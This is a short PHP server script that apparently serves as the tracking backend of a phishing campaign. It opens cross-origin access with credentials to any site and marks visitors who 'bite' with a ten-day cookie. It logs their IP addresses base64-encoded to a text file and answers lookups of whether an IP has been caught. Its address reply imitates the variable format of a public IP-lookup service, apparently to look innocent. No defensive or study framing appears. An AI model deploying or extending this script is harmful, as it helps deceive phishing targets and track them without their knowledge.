<?php

$db = "fiship.txt";
$addr = $_SERVER["REMOTE_ADDR"];

header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Credentials: true");


if(isset($_GET['getaddr'])){
    header('Content-type: text/json; charset=utf-8');
    if (isset($_COOKIE['fishcookie'])){
        echo 'var returnCitySN = {"cip": "'.$addr.'", "bobo":"111111"};';
        }
        else{
            echo 'var returnCitySN = {"cip": "'.$addr.'", "bobo": "000000"};';
        }
}
if(isset($_GET['bite1'])){
    setcookie("fishcookie","123321", time()+3600*240);  
}


if(isset($_GET['ip'])){
    $fishIP = @$_GET['ip'];
    $line = file_get_contents($db);
    $fishIPs = explode("\n", $line);
    if (@in_array(base64_encode($fishIP), $fishIPs)) {
        echo "ip exist";
    }else {
        $fishsh = fopen($db, "a") or die("Unable to open fish file!");
        fwrite($fishsh, base64_encode($fishIP) . "\n");
        fclose($fishsh);
    }
}


if(isset($_GET['search'])){

    $ip = @$_GET['search'];

    if (file_exists($db)) {
        $line = file_get_contents($db);
        $botIPs = explode("\n", $line);
        if (@in_array(base64_encode($ip), $botIPs)) {
            echo "in";
        }else {
            echo "not in";
        }
    }
}
?>
